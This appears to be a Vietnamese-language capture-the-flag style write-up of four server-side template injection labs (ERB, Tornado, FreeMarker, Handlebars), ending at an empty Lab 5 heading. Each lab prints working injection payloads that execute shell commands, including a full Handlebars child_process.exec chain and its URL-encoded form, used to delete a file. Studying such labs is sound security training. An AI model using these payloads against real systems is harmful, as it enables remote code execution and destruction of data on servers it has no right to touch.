# Trần Mạnh Huy  SSTI-Server side template injection

* [Lab 1: Basic server-side template injection](#lab-1-basic-server-side-template-injection)
* [Lab 2: Basic server-side template injection (code context)](#lab-2-basic-server-side-template-injection-code-context)
* [Lab 3: Server-side template injection using documentation](#lab-3-server-side-template-injection-using-documentation)
* [Lab 4: Server-side template injection in an unknown language with a documented exploit](#lab-4-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
* [Lab 5: Server-side template injection with information disclosure via user-supplied objects](#lab-5-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)

## Lab 1: Basic server-side template injection

```
 This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 

```

### Ở bài lab này thì biết được luôn template là ERB, hoặc kh thì ta lên Payload All The Things thử từng cái một cũng được.

Đầu tiên check view details từng sản phẩm, để ý ở sản phẩm đầu tiên trả về message = ***Unfortunately this product is out of stock***, còn những cái khác còn nên vẫn vào bình thường, khai thác SSTI ở đây bằng cách dùng payload hoạt động được trên template erb, khi chạy qua template engine để xử lí, nó sẽ được thực thi. 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab1_01.jpg)

#### Test payload để xác nhận là ssti của erb template: <%= 7*7 %> . Ta được server trả về kết quả: 49. Vậy là xác nhận xong

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab1_02.jpg)

#### Tiếp theo đến với việc khai thác, sử dụng **<%= system('pwd') %>** để kiểm tra xem đang nằm ở đâu hoặc dùng **<%= system('ls /) %>** để xem thư mục gốc chứa những file hay folder nào :

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab1_03.jpg)

#### Vậy là đang ở trong thư mục /home/carlos . Để hoàn thành thì ls thử được file **morale.txt** . Việc còn lại để hoàn thành bài lab chỉ cần delete file là xong.
Dùng payload: ***<%= system('rm morale.txt) %>***

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab1_04.jpg)

## Lab 2: Basic server-side template injection (code context)

```
 This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 

```

#### Bài lab này cần đăng nhập tài khoản, wiener:peter . Sau khi đăng nhập thì check thử phần my account, ta thấy có phần update email với phần preferrd name có thể thực hiện giao thức POST. 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_01.jpg)

Thử để giá trị ***first name*** và ***name*** và check phần comment thử: 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_02.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_03.jpg)

Rõ ràng là server đã dùng tags để xử lí logic qua template engine, ở đây là template Tornado. Cụ thể ta có check ở burp suite sau khi sửa dổi phần ***preferred name*** thành ***username***và ***submit*** được như sau:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_04.jpg)

Để ý thấy phần display=user.username, đúng chuẩn xử lí tags trong template engine luôn, đến đây thay bằng 1 sô payload của Tornado ssti như sau:


```
{{7*7}} = 49
${7*7} = ${7*7}
{{foobar}} = Error
{{7*'7'}} = 7777777
______
{% import foobar %} = Error
{% import os %}

{% import os %}

{{os.system('whoami')}}
{{os.system('whoami')}}
_______

```
Vì user.username đã ở sẵn trong filters (chuyển hóa các giá trị của biến và đối số trong tags) có dạng {{}} nên test chỉ việc dùng 7*7 thay vào chỗ user.username. Ta được:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_05.jpg)

#### Bây giờ thực hiện code để xóa file morale.txt thôi nào: 

Dùng payload sau để hiển thị đường dẫn thư mục hiện tại:

```
{% import os %}

{{os.system('whoami')}}

```
Lúc đầu thử truyền vào giá trị {%+import+os+%}+{{os.system('pwd')}} thì toàn hiển thị lỗi, sau 1 lúc thử lại thì nhớ ra là biến đang được xử lí trong filter/tags {{}} . Vì vậy để truyền vào giá trị trên thì cần sửa payload như sau: ***user.nickname}}{%+import+os+%}+{{os.system('pwd')*** . Lúc này template engine sẽ xử lí: {{user.nickname}} {% import os %} và {{os.system('pwd'}}. Ta được:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_06.jpg)

#### Đến đây thì tương tự như bài trên, đang ở đường dẫn: /home/carlos nên sửa **pwd** thành **ls** sẽ có file morale.txt được hiển thị. Để giải quyết bài lab, sửa payload thành : 

```
***user.nickname}}{%+import+os+%}+{{os.system('rm morale.txt')*** 
```

Như vậy là ta đã xóa được file morale.txt như bài lab mong muốn.

> Reference link payload: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

## Lab 3: Server-side template injection using documentation

```
 This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r

```
Bài này chứa SSTI ở phần **Edit template**, để ý khi edit template thì các giá trị được hiển thị thông qua **${}**, thử truyền **${abcd}** để xem có báo lỗi gì kh:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_10.jpg)


Hiển thị đây là freeMaker template trong java. 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_01.jpg)


Vậy thì tấn công thôi, sử dụng 1 số payload sau để tấn công:

```
{{7*7}} = {{7*7}}
${7*7} = 49
#{7*7} = 49 -- (legacy)
${7*'7'} Nothing
${foobar}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('

```
Ở dây dùng **${"freemarker.template.utility.Execute"?new()("ls")}** để xem đường file và folder trong thư mục:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_05.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_06.jpg)

Hiển thị file morale.txt, đến đây thì xóa file morale.txt thôi: **${"freemarker.template.utility.Execute"?new()("rm morale.txt")**. Vậy là xong bài lab.

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_03.jpg)

## Lab 4: Server-side template injection in an unknown language with a documented exploit

```
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 

```
#### Bài lab này tương tự như bài 1, khi mà bấm vào view details ở post 1 thì trả về message "Unfortunately ...", thử test ssti đơn giản bằng **{{7*7}}** thì server trả về lỗi, ta xác định được tempalte đang được dùng là Handlebars.

![]()

Đến đây có thể dùng payloads của handerbars template sau để test: 

```
= Error
-----
${7*7} = ${7*7}
-----
Nothing
-----
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

```
Ở đây để truyền xóa được file morale.txt, vẫn như cái bài lab trước thay đoạn payload trên với 'whoami' -> 'rm /home/carlos/morale.txt':

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

```
Sau đó chỉ cần url encode rồi truyền vào tham số message= trên thanh search là xong bài lab.

> url encode: %7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d

## Lab 5: Server-side template injection with information disclosure via user-supplied objects
